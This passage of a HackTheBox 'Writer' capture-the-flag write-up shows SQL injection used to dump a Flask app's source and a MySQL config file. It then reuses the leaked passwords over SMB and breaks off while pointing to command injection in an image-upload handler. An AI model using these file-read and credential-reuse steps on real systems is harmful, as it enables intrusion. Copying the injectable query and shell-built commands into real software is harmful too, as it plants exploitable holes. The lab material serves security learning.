+<span style=color:#75715e>#       Alias /static /var/www/writer2_project/static</span>
+<span style=color:#75715e>#       &lt;Directory /var/www/writer2_project/static&gt;</span>
+<span style=color:#75715e>#               Require all granted</span>
+<span style=color:#75715e>#       &lt;/Directory&gt;</span>
+<span style=color:#75715e>#</span>
+<span style=color:#75715e>#       &lt;Directory /var/www/writer2_project/writerv2&gt;</span>
+<span style=color:#75715e>#               &lt;Files wsgi.py&gt;</span>
+<span style=color:#75715e>#                       Require all granted</span>
+<span style=color:#75715e>#               &lt;/Files&gt;</span>
+<span style=color:#75715e>#       &lt;/Directory&gt;</span>
+<span style=color:#75715e>#</span>
+<span style=color:#75715e>#       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env</span>
+<span style=color:#75715e>#       WSGIProcessGroup writer2_project</span>
+<span style=color:#75715e>#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py</span>
+<span style=color:#75715e>#        ErrorLog ${APACHE_LOG_DIR}/error.log</span>
+<span style=color:#75715e>#        LogLevel warn</span>
+<span style=color:#75715e>#        CustomLog ${APACHE_LOG_DIR}/access.log combined</span>
+<span style=color:#75715e>#</span>
+<span style=color:#75715e>#&lt;/VirtualHost&gt;</span>
+<span style=color:#75715e># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</code></pre></div><h2 id=python-source-code-analysis>Python source code analysis</h2>
+<p>The previous Apache configuration file points to the main script that the server is running, which is <code>/var/www/writer.htb/writer.wsgi</code>, a common file to configure a Flask application (which is a well-known Python web framework):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 sqli.py /var/www/writer.htb/writer.wsgi
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
+
+<span style=color:#f92672>import</span> sys
+<span style=color:#f92672>import</span> logging
+<span style=color:#f92672>import</span> random
+<span style=color:#f92672>import</span> os
+
+<span style=color:#75715e># Define logging</span>
+logging<span style=color:#f92672>.</span>basicConfig(stream<span style=color:#f92672>=</span>sys<span style=color:#f92672>.</span>stderr)
+sys<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>insert(<span style=color:#ae81ff>0</span>,<span style=color:#e6db74>&#34;/var/www/writer.htb/&#34;</span>)
+
+<span style=color:#75715e># Import the __init__.py from the app folder</span>
+<span style=color:#f92672>from</span> writer <span style=color:#f92672>import</span> app <span style=color:#66d9ef>as</span> application
+application<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;SECRET_KEY&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
+</code></pre></div><p>This Python script is importing another one from <code>writer</code>. Python uses some special filenames for importing modules. Basically, the imported script is at <code>/var/www/writer.htb/writer/__init__.py</code>. This is a really large script containing all the back-end logic (wait for more than 20 minutes to dump the whole file). Some methods of the following code has been stripped because of their length:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 sqli.py /var/www/writer.htb/writer/__init__.py
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, session, redirect, url_for, request, render_template
+<span style=color:#f92672>from</span> mysql.connector <span style=color:#f92672>import</span> errorcode
+<span style=color:#f92672>import</span> mysql.connector
+<span style=color:#f92672>import</span> urllib.request
+<span style=color:#f92672>import</span> os
+<span style=color:#f92672>import</span> PIL
+<span style=color:#f92672>from</span> PIL <span style=color:#f92672>import</span> Image, UnidentifiedImageError
+<span style=color:#f92672>import</span> hashlib
+
+app <span style=color:#f92672>=</span> Flask(__name__,static_url_path<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>,static_folder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;static&#39;</span>,template_folder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;templates&#39;</span>)
+
+<span style=color:#75715e>#Define connection for database</span>
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>connections</span>():
+    <span style=color:#66d9ef>try</span>:
+        connector <span style=color:#f92672>=</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>connect(user<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span>, password<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ToughPasswordToCrack&#39;</span>, host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, database<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;writer&#39;</span>)
+        <span style=color:#66d9ef>return</span> connector
+    <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
+        <span style=color:#66d9ef>if</span> err<span style=color:#f92672>.</span>errno <span style=color:#f92672>==</span> errorcode<span style=color:#f92672>.</span>ER_ACCESS_DENIED_ERROR:
+            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Something is wrong with your db user name or password!&#34;</span>)
+        <span style=color:#66d9ef>elif</span> err<span style=color:#f92672>.</span>errno <span style=color:#f92672>==</span> errorcode<span style=color:#f92672>.</span>ER_BAD_DB_ERROR:
+            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database does not exist&#34;</span>)
+        <span style=color:#66d9ef>else</span>:
+            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Another exception, returning!&#34;</span>)
+    <span style=color:#66d9ef>else</span>:
+        print (<span style=color:#e6db74>&#39;Connection to DB is ready!&#39;</span>)
+
+<span style=color:#75715e>#Define homepage</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/&#39;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>home_page</span>():
+    <span style=color:#66d9ef>try</span>:
+        connector <span style=color:#f92672>=</span> connections()
+    <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
+            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database error&#34;</span>)
+    cursor <span style=color:#f92672>=</span> connector<span style=color:#f92672>.</span>cursor()
+    sql_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM stories;&#34;</span>
+    cursor<span style=color:#f92672>.</span>execute(sql_command)
+    results <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
+    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;blog/blog.html&#39;</span>, results<span style=color:#f92672>=</span>results)
+
+<span style=color:#75715e>#Define about page</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/about&#39;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>about</span>():
+    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;blog/about.html&#39;</span>)
+
+<span style=color:#75715e>#Define contact page</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/contact&#39;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>contact</span>():
+    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;blog/contact.html&#39;</span>)
+
+<span style=color:#75715e>#Define blog posts</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/blog/post/&lt;id&gt;&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>blog_post</span>(id):
+    <span style=color:#66d9ef>try</span>:
+        connector <span style=color:#f92672>=</span> connections()
+    <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
+        <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database error&#34;</span>)
+    cursor <span style=color:#f92672>=</span> connector<span style=color:#f92672>.</span>cursor()
+    cursor<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#34;SELECT * FROM stories WHERE id = </span><span style=color:#e6db74>%(id)s</span><span style=color:#e6db74>;&#34;</span>, {<span style=color:#e6db74>&#39;id&#39;</span>: id})
+    results <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
+    sql_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM stories;&#34;</span>
+    cursor<span style=color:#f92672>.</span>execute(sql_command)
+    stories <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
+    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;blog/blog-single.html&#39;</span>, results<span style=color:#f92672>=</span>results, stories<span style=color:#f92672>=</span>stories)
+
+<span style=color:#75715e>#Define dashboard for authenticated users</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard&#39;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>dashboard</span>():
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#e6db74>&#39;user&#39;</span> <span style=color:#f92672>in</span> session):
+        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>)
+    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;dashboard.html&#39;</span>)
+
+<span style=color:#75715e>#Define stories page for dashboard and edit/delete pages</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/stories&#39;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>stories</span>():
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#e6db74>&#39;user&#39;</span> <span style=color:#f92672>in</span> session):
+        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>)
+    <span style=color:#66d9ef>try</span>:
+        connector <span style=color:#f92672>=</span> connections()
+    <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
+        <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database error&#34;</span>)
+    cursor <span style=color:#f92672>=</span> connector<span style=color:#f92672>.</span>cursor()
+    sql_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Select * From stories;&#34;</span>
+    cursor<span style=color:#f92672>.</span>execute(sql_command)
+    results <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
+    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;stories.html&#39;</span>, results<span style=color:#f92672>=</span>results)
+
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/stories/add&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>add_story</span>():
+    <span style=color:#75715e># ...</span>
+
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/stories/edit/&lt;id&gt;&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>edit_story</span>(id):
+    <span style=color:#75715e># ...</span>
+
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/stories/delete/&lt;id&gt;&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>delete_story</span>(id):
+    <span style=color:#75715e># ...</span>
+
+<span style=color:#75715e>#Define user page for dashboard</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/users&#39;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>users</span>():
+    <span style=color:#75715e># ...</span>
+
+<span style=color:#75715e>#Define settings page</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/dashboard/settings&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>])
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>settings</span>():
+    <span style=color:#75715e># ...</span>
+
+<span style=color:#75715e>#Define authentication mechanism</span>
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/administrative&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>, <span style=color:#e6db74>&#39;GET&#39;</span>])
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login_page</span>():
+    <span style=color:#66d9ef>if</span> (<span style=color:#e6db74>&#39;user&#39;</span> <span style=color:#f92672>in</span> session):
+        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/dashboard&#39;</span>)
+    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
+        username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;uname&#39;</span>)
+        password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>)
+        password <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(password<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))<span style=color:#f92672>.</span>hexdigest()
+        <span style=color:#66d9ef>try</span>:
+            connector <span style=color:#f92672>=</span> connections()
+        <span style=color:#66d9ef>except</span> mysql<span style=color:#f92672>.</span>connector<span style=color:#f92672>.</span>Error <span style=color:#66d9ef>as</span> err:
+            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;Database error&#34;</span>)
+        <span style=color:#66d9ef>try</span>:
+            cursor <span style=color:#f92672>=</span> connector<span style=color:#f92672>.</span>cursor()
+            sql_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Select * From users Where username = &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39; And password = &#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;&#34;</span> <span style=color:#f92672>%</span> (username, password)
+            cursor<span style=color:#f92672>.</span>execute(sql_command)
+            results <span style=color:#f92672>=</span> cursor<span style=color:#f92672>.</span>fetchall()
+            <span style=color:#66d9ef>for</span> result <span style=color:#f92672>in</span> results:
+                print(<span style=color:#e6db74>&#34;Got result&#34;</span>)
+            <span style=color:#66d9ef>if</span> result <span style=color:#f92672>and</span> len(result) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
+                session[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>=</span> username
+                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;success.html&#39;</span>, results<span style=color:#f92672>=</span>results)
+            <span style=color:#66d9ef>else</span>:
+                error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Incorrect credentials supplied&#34;</span>
+                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>, error<span style=color:#f92672>=</span>error)
+        <span style=color:#66d9ef>except</span>:
+            error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Incorrect credentials supplied&#34;</span>
+            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>, error<span style=color:#f92672>=</span>error)
+    <span style=color:#66d9ef>else</span>:
+        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>)
+
+<span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#34;/logout&#34;</span>)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>logout</span>():
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#e6db74>&#39;user&#39;</span> <span style=color:#f92672>in</span> session):
+        <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>)
+    session<span style=color:#f92672>.</span>pop(<span style=color:#e6db74>&#39;user&#39;</span>)
+    <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#39;/&#39;</span>)
+
+<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+   app<span style=color:#f92672>.</span>run(<span style=color:#e6db74>&#34;0.0.0.0&#34;</span>)
+</code></pre></div><p>This large script contains the following password: <code>ToughPasswordToCrack</code>.</p>
+<h2 id=smb-enumeration>SMB enumeration</h2>
+<p>At first glance, we have the password to connect to MySQL (<code>ToughPasswordToCrack</code>) as user <code>writer</code>. However, this password is reused for the user <code>kyle</code> in SMB:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ smbmap -H 10.10.11.101 -u kyle -p ToughPasswordToCrack
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>[+] IP: 10.10.11.101:445        Name: 10.10.11.101              Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  READ ONLY       Printer Drivers
+        writer2_project                                         READ, WRITE
+        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))
+</code></pre></div><p>As <code>kyle</code>, we can read and write files into <code>writer2_project</code>. Let&rsquo;s download all the files:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ smbclient -U kyle //10.10.11.101/writer2_project
+Enter WORKGROUP\kyle&#39;s password:
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Mon Aug  2 19:46:12 2021
+  ..                                  D        0  Tue Jun 22 13:55:06 2021
+  static                              D        0  Sun May 16 16:29:16 2021
+  staticfiles                         D        0  Fri Jul  9 06:59:42 2021
+  writer_web                          D        0  Wed May 19 11:26:18 2021
+  requirements.txt                    N       15  Mon Aug  2 19:46:01 2021
+  writerv2                            D        0  Wed May 19 08:32:41 2021
+  manage.py                           N      806  Mon Aug  2 19:46:01 2021
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>                7151096 blocks of size 1024. 1985880 blocks available
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; mget *
+...
+</code></pre></div><p>Once downloaded, we see that this is a Django project (another Python web framework). It seems that the project is not finished, but it is enough to see another MySQL user and password.</p>
+<p>The password is obtained checking <code>writer2_project/writer2/settings.py</code> for the following fragment of code:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#75715e># Database</span>
+<span style=color:#75715e># https://docs.djangoproject.com/en/1.10/ref/settings/#databases</span>
+
+DATABASES <span style=color:#f92672>=</span> {
+    <span style=color:#e6db74>&#39;default&#39;</span>: {
+        <span style=color:#e6db74>&#39;ENGINE&#39;</span>: <span style=color:#e6db74>&#39;django.db.backends.mysql&#39;</span>,
+        <span style=color:#e6db74>&#39;OPTIONS&#39;</span>: {
+            <span style=color:#e6db74>&#39;read_default_file&#39;</span>: <span style=color:#e6db74>&#39;/etc/mysql/my.cnf&#39;</span>
+        }
+    }
+}
+</code></pre></div><p>Then we can check the file <code>/etc/mysql/my.cnf</code> using the SQLi vulnerability:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python sqli.py /etc/mysql/my.cnf
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-toml data-lang=toml><span style=color:#75715e># The MariaDB configuration file</span>
+<span style=color:#75715e>#</span>
+<span style=color:#75715e># The MariaDB/MySQL tools read configuration files in the following order:</span>
+<span style=color:#75715e># 1. &#34;/etc/mysql/mariadb.cnf&#34; (this file) to set global defaults,</span>
+<span style=color:#75715e># 2. &#34;/etc/mysql/conf.d/*.cnf&#34; to set global options.</span>
+<span style=color:#75715e># 3. &#34;/etc/mysql/mariadb.conf.d/*.cnf&#34; to set MariaDB-only options.</span>
+<span style=color:#75715e># 4. &#34;~/.my.cnf&#34; to set user-specific options.</span>
+<span style=color:#75715e>#</span>
+<span style=color:#75715e># If the same option is defined multiple times, the last one will apply.</span>
+<span style=color:#75715e>#</span>
+<span style=color:#75715e># One can use all long options that the program supports.</span>
+<span style=color:#75715e># Run program with --help to get a list of available options and with</span>
+<span style=color:#75715e># --print-defaults to see which it would actually understand and use.</span>
+
+<span style=color:#75715e>#</span>
+<span style=color:#75715e># This group is read both both by the client and the server</span>
+<span style=color:#75715e># use it for options that affect everything</span>
+<span style=color:#75715e>#</span>
+[<span style=color:#a6e22e>client-server</span>]
+
+<span style=color:#75715e># Import all .cnf files from configuration directory</span>
+<span style=color:#960050;background-color:#1e0010>!</span><span style=color:#a6e22e>includedir</span> <span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>etc</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>mysql</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>d</span><span style=color:#960050;background-color:#1e0010>/</span>
+<span style=color:#960050;background-color:#1e0010>!</span><span style=color:#a6e22e>includedir</span> <span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>etc</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>mysql</span><span style=color:#960050;background-color:#1e0010>/</span><span style=color:#a6e22e>mariadb</span>.<span style=color:#a6e22e>conf</span>.<span style=color:#a6e22e>d</span><span style=color:#960050;background-color:#1e0010>/</span>
+
+[<span style=color:#a6e22e>client</span>]
+<span style=color:#a6e22e>database</span> = <span style=color:#a6e22e>dev</span>
+<span style=color:#a6e22e>user</span> = <span style=color:#a6e22e>djangouser</span>
+<span style=color:#a6e22e>password</span> = <span style=color:#a6e22e>DjangoSuperPassword</span>
+<span style=color:#a6e22e>default-character-set</span> = <span style=color:#a6e22e>utf8</span>
+</code></pre></div><p>So we have got new credentials for MySQL: <code>djangouser:DjangoSuperPassword</code>.</p>
+<h2 id=foothold-on-the-machine>Foothold on the machine</h2>
+<p>Inside the administration dashboard, we are able to manage the whole blog (create new stories, edit stories and even delete stories):</p>
+<p><img src=/images/HTB/Writer/Writer-stories.png alt="Writer stories"></p>
+<p>The form used to upload a new story is the next one:</p>
+<p><img src=/images/HTB/Writer/Writer-add1.png alt="Writer add story (image by file)"></p>
+<p>There are two ways to upload an image for the story, one being as a file, and other being as an URL:</p>
+<p><img src=/images/HTB/Writer/Writer-add2.png alt="Writer add story (image by URL)"></p>
+<p>The difference between the last two screenshots is the story image field, the difference is very subtle.</p>
+<p>To get access to the machine, we can check <code>__init__.py</code> again. The script is doing something weird when receiving images for new stories of the blog. These are the odd lines of code:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-python data-lang=python><span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
+    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>files[<span style=color:#e6db74>&#39;image&#39;</span>]:
+        image <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>files[<span style=color:#e6db74>&#39;image&#39;</span>]
+        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;.jpg&#34;</span> <span style=color:#f92672>in</span> image<span style=color:#f92672>.</span>filename:
+            path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(<span style=color:#e6db74>&#39;/var/www/writer.htb/writer/static/img/&#39;</span>, image<span style=color:#f92672>.</span>filename)
+            image<span style=color:#f92672>.</span>save(path)
+            image <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/img/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(image<span style=color:#f92672>.</span>filename)
+        <span style=color:#66d9ef>else</span>:
+            error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;File extensions must be in .jpg!&#34;</span>
+            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;add.html&#39;</span>, error<span style=color:#f92672>=</span>error)
+    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;image_url&#39;</span>):
+        image_url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;image_url&#39;</span>)
+        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;.jpg&#34;</span> <span style=color:#f92672>in</span> image_url:
+            <span style=color:#66d9ef>try</span>:
+                local_filename, headers <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>urlretrieve(image_url)
+                os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;mv </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>.jpg&#34;</span><span style=color:#f92672>.</span>format(local_filename, local_filename))
+                image <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>.jpg&#34;</span><span style=color:#f92672>.</span>format(local_filename)
+                <span style=color:#66d9ef>try</span>:
+                    im <span style=color:#f92672>=</span> Image<span style=color:#f92672>.</span>open(image)
+                    im<span style=color:#f92672>.</span>verify()
+                    im<span style=color:#f92672>.</span>close()
+                    image <span style=color:#f92672>=</span> image<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;/tmp/&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>)
+                    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;mv /tmp/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74> /var/www/writer.htb/writer/static/img/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(image, image))
+                    image <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/img/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(image)
+                <span style=color:#66d9ef>except</span> PIL<span style=color:#f92672>.</span>UnidentifiedImageError:
+                    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;rm </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(image))
+                    error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Not a valid image file!&#34;</span>
+                    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;add.html&#39;</span>, error<span style=color:#f92672>=</span>error)
+            <span style=color:#66d9ef>except</span>:
+                error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Issue uploading picture&#34;</span>
+                <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;add.html&#39;</span>, error<span style=color:#f92672>=</span>error)
+        <span style=color:#66d9ef>else</span>:
+            error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;File extensions must be in .jpg!&#34;</span>
+            <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;add.html&#39;</span>, error<span style=color:#f92672>=</span>error)
+</code></pre></div><p>These lines are present both in <code>/dashboard/stories/add</code> and <code>/dashboard/stories/edit/&lt;id></code>. As previously said, there are two ways to upload an image. One is directly from the web posting it as a file, and the other one is specifying an URL where the image is located.</p>
+<p>The documentation for <code>urllib.requests.urlretrieve()</code> says the following:</p>
+<blockquote>
+<p><strong>retrieve</strong>(<em>url</em>, <em>filename=None</em>, <em>reporthook=None</em>, <em>data=None</em>): Retrieves the contents of <em>url</em> and places it in <em>filename</em>. The return value is a tuple consisting of a local filename [&mldr;]. If <em>filename</em> is not given and the URL refers to a local file, the input filename is returned. If the URL is non-local and <em>filename</em> is not given, the filename is the output of <code>tempfile.mktemp()</code> with a suffix that matches the suffix of the last path component of the input URL. [&mldr;].</p>
+</blockquote>
+<p>This means that if the URL points to a local file, the filename will be exactly the name of that file. But if the file is obtained from outside, then a random name will be chosen.</p>
